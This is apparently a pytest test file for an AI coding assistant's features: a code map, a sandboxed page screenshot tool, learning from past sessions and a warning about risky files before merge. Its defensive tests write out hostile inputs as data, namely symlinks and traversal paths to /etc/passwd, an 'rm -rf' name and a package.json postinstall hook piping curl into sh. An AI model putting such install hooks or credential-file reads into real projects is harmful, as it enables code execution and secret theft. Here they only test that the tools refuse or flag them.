"""v0.943 HOOLA CODE CATCHES UP (owner, on the Cursor comparison's "Where it is behind": "No index of the code ... It
doesn't open a browser to check the app it changed ... It doesn't learn from use ... WORK ON IT AND DEPLOY ALL").

The code map, the look tool, learning from her earlier sessions, the risky-files note and the file reader."""
import os
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]


def _repo(tmp: Path) -> Path:
    r = tmp / "repo"
    (r / "app" / "orders").mkdir(parents=True)
    (r / "app" / "orders" / "api.py").write_text("from app.orders.calc import total\n\ndef create_order(x):\n    return total(x)\n\nclass OrderError(Exception):\n    pass\n")
    (r / "app" / "orders" / "calc.py").write_text("def total(items):\n    return sum(items)\n")
    (r / "web").mkdir()
    (r / "web" / "cart.ts").write_text("export function addItem(a: number) { return a }\nexport const clear = () => 0\nclass Cart {}\n")
    (r / "lib").mkdir()
    (r / "lib" / "main.dart").write_text("class HomePage extends StatelessWidget {}\nvoid main() {}\n")
    (r / ".env").write_text("SECRET_KEY=abc\n")
    return r


def _paths(r: Path) -> list[str]:
    out = []
    for d, _, fs in os.walk(r):
        for f in fs:
            out.append(os.path.relpath(os.path.join(d, f), r))
    return sorted(out)


def test_the_code_map_reads_names_in_code_and_ranks_her_words_first(tmp_path):
    from app.devsahayak import repoindex as RX
    r = _repo(tmp_path)
    idx = RX.build(r, _paths(r), "fix the cart total")
    assert ("create_order", 3) in idx["files"]["app/orders/api.py"] and ("OrderError", 6) in idx["files"]["app/orders/api.py"]
    assert [n for n, _ in idx["files"]["web/cart.ts"]] == ["addItem", "clear", "Cart"]
    assert "HomePage" in [n for n, _ in idx["files"]["lib/main.dart"]]
    assert ".env" not in idx["files"]                        # secrets are never read into it
    txt = RX.map_text(idx, "fix the cart total")
    assert txt.startswith("<repo_map") and txt.rstrip().endswith("</repo_map>")
    assert txt.index("web/cart.ts") < txt.index("lib/main.dart")   # her words first
    # the tool
    assert "app/orders/api.py:3" in RX.run_tool(r, _paths(r), {"action": "find", "name": "create_order"}, idx)
    refs = RX.run_tool(r, _paths(r), {"action": "refs", "name": "total"}, idx)
    assert "app/orders/api.py:1" in refs and "app/orders/calc.py:1" in refs
    assert "Give the exact name" in RX.run_tool(r, _paths(r), {"action": "find", "name": "rm -rf"}, idx)
    # file reads the file as it is now (after an edit)
    (r / "web" / "cart.ts").write_text("export function removeItem() {}\n")
    assert "removeItem:1" in RX.run_tool(r, _paths(r), {"action": "file", "path": "web/cart.ts"}, idx)
    assert "holds secrets" in RX.run_tool(r, _paths(r), {"action": "file", "path": ".env"}, idx)


def test_the_look_server_never_serves_a_link_or_a_secret(tmp_path):
    from app.devsahayak import look as LK
    r = _repo(tmp_path)
    (r / "index.html").write_text("<html><body>Hi</body></html>")
    (r / "pw.html").symlink_to("/etc/passwd")
    (r / "out").symlink_to("/etc")
    assert LK._allowed(r, "index.html")
    assert not LK._allowed(r, "pw.html") and not LK._allowed(r, "out/passwd")   # links lead out of the copy
    assert not LK._allowed(r, ".env") and not LK._allowed(r, "../x")
    assert LK.check(r, "app/orders/api.py")["ok"] is False                     # only pages
    assert "link" in LK.check(r, "pw.html")["note"]


def test_look_words_say_what_a_person_would_notice():
    from app.devsahayak import look as LK
    res = {"ok": True, "path": "index.html", "errors": ["boom"], "failed": ["/missing.png"],
           "refused": ["https://cdn.example/x.js"],
           "screens": [{"screen": "phone", "size": [390, 844], "png": b"",
                        "facts": {"vw": 390, "sw": 908, "bad": ["a.png"], "small": ["Buy 30x20"], "tiny": 2, "words": 40, "vp": False}}]}
    w = LK.words(res)
    assert "WIDER THAN THE SCREEN" in w and "viewport" in w and "a.png" in w and "Buy 30x20" in w
    assert "boom" in w and "/missing.png" in w and "cdn.example" in w and "say so to her" in w


@pytest.mark.skipif(not os.environ.get("HOOLA_CHROMIUM") and not Path("/opt/pw-browsers/chromium-1243/chrome-linux64/chrome").exists(),
                    reason="no Chromium here")
def test_look_opens_the_page_in_a_real_browser_and_blocks_the_internet(tmp_path, monkeypatch):
    if not os.environ.get("HOOLA_CHROMIUM"):
        monkeypatch.setenv("HOOLA_CHROMIUM", "/opt/pw-browsers/chromium-1243/chrome-linux64/chrome")
    from app.devsahayak import look as LK
    r = _repo(tmp_path)
    (r / "index.html").write_text('<meta name="viewport" content="width=device-width"><script src="https://cdn.example/x.js">'
                                  '</script><div style="width:900px">Too wide</div><img src="nope.png"><script>console.error("boom")</script>')
    res = LK.check(r, "index.html")
    assert res["ok"], res
    assert any("boom" in e for e in res["errors"]) and "/nope.png" in res["failed"]
    assert any("cdn.example" in u for u in res["refused"])                    # the page reached nothing outside
    phone = res["screens"][0]
    assert phone["screen"] == "phone" and phone["png"][:4] == b"\x89PNG" and int(phone["facts"]["sw"]) > 390
    names = LK.keep(tmp_path / "sess", res)
    assert len(names) == 2 and LK.shot_path(tmp_path / "sess", names[0]) is not None
    assert LK.shot_path(tmp_path / "sess", "../../etc/passwd") is None


def test_learning_reads_what_really_happened_on_the_repo():
    from app.devsahayak import learned as LN
    rows = [
        {"status": "closed", "title": "Add a dark mode toggle", "steps": [{"k": "note", "her": True, "text": "add dark mode"},
                                                                            {"k": "note", "her": True, "text": "no, not like this - keep the old colours"}],
         "plan": {"note": "use tailwind not css files"}, "ci_round": 2, "files": ["web/theme.css"]},
        {"status": "merged", "title": "Fix the cart total", "steps": [{"k": "note", "her": True, "text": "fix total"},
                                                                       {"k": "note", "her": True, "text": "thanks, looks good"}],
         "plan": {}, "ci_round": 0, "files": ["web/cart.ts", "app/orders/calc.py"]},
        {"status": "merged", "title": "Orders API", "steps": [], "plan": {}, "ci_round": 1, "files": ["app/orders/calc.py"]},
    ]
    s = LN.summarise(rows)
    assert s["merged"] == 2 and s["closed"] == 1 and s["closed_titles"] == ["Add a dark mode toggle"]
    assert s["pushback"] == ["no, not like this - keep the old colours"]      # "thanks" is not a correction; the ask is skipped
    assert s["plan_notes"] == ["use tailwind not css files"] and s["ci_red"] == 2 and s["touched"][0] == "app/orders/calc.py"
    b = LN.block(s)
    assert b.startswith("<what_worked_here>") and "did NOT want" in b and "run the repo's tests" in b and "as data" in b
    assert LN.block(LN.summarise([])) == ""


def test_learning_comes_from_her_own_rows_only(env):
    import app.devsahayak.models  # noqa: F401
    from app.db import init_db, session
    from app.devsahayak.models import DevTask
    from app.devsahayak import learned as LN
    init_db()
    with session() as s:
        s.add(DevTask(tenant_id="a", repo="acme/shop", status="closed", title="Bad idea", text="x"))
        s.add(DevTask(tenant_id="b", repo="acme/shop", status="closed", title="Someone else's", text="x"))
        new = DevTask(tenant_id="a", repo="acme/shop", status="new", text="next")
        s.add(new)
        s.flush()
        nid = new.id

    class T:
        tenant_id, repo, id = "a", "acme/shop", nid
    b = LN.primer(T())
    assert "Bad idea" in b and "Someone else's" not in b


def test_risky_files_are_named_in_red_before_she_merges():
    from app.devsahayak import service as S
    out = S.risky_files([".github/workflows/ci.yml", ".hoola/lab.json", "AGENTS.md", "app/x.py", "package.json",
                         ".vscode/tasks.json", "docs/readme.md"],
                        [{"path": "package.json", "diff": '+  "postinstall": "curl x | sh"'}])
    names = [r["path"] for r in out]
    assert names == [".github/workflows/ci.yml", ".hoola/lab.json", "AGENTS.md", "package.json", ".vscode/tasks.json"]
    assert S.risky_files(["package.json"], [{"path": "package.json", "diff": '+  "name": "x"'}]) == []


def test_the_engine_and_the_phone_are_wired():
    eng = (ROOT / "server/app/devsahayak/engine.py").read_text()
    assert "_repo_map(ses" in eng and "_learned_primer(t)" in eng
    assert "extra.append(RX.CODE_MAP_TOOL)" in eng and "extra.append(LK.LOOK_TOOL)" in eng
    assert 'if b["name"] == "code_map":' in eng and 'if b["name"] == "look":' in eng and "_drop_old_looks(msgs)" in eng
    svc = (ROOT / "server/app/devsahayak/service.py").read_text()
    assert 'v["risky_files"] = risky_files(' in svc
    api = (ROOT / "server/app/devsahayak/api.py").read_text()
    assert '@r.get("/tasks/{tid}/shots/{name}")' in api
    f = (ROOT / "lib/ui/code/code_files.dart").read_text()
    for name in ("class CodeFilesPage", "class CodeLookCard", "class CodeRiskyNote", "Ask Hoola about these lines"):
        assert name in f, name
    assert "Color(0x" not in f and "FontWeight.w800" not in f and "BackdropFilter" not in f
    ses = (ROOT / "lib/ui/code/code_session.dart").read_text()
    assert "CodeLookCard(" in ses and "CodeRiskyNote(" in ses and "CodeFilesPage(" in ses
    assert "CodeRiskyNote(" in (ROOT / "lib/ui/code/code_changes.dart").read_text()


def test_drop_old_looks_keeps_only_the_newest_pictures():
    from app.devsahayak import engine as EN
    msgs = [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "a", "content": "x"},
                                         {"type": "text", "text": "The screenshots from look (phone first, then computer):"},
                                         {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "AAA"}}]}]
    EN._drop_old_looks(msgs)
    assert not any(b.get("type") == "image" for b in msgs[0]["content"])
    assert msgs[0]["content"][0]["type"] == "tool_result"


def test_version():
    main = (ROOT / "server/app/main.py").read_text()
    assert 'APP_VERSION = "0.999.13"' in main
    assert "version: 0.999.13+1011" in (ROOT / "pubspec.yaml").read_text()
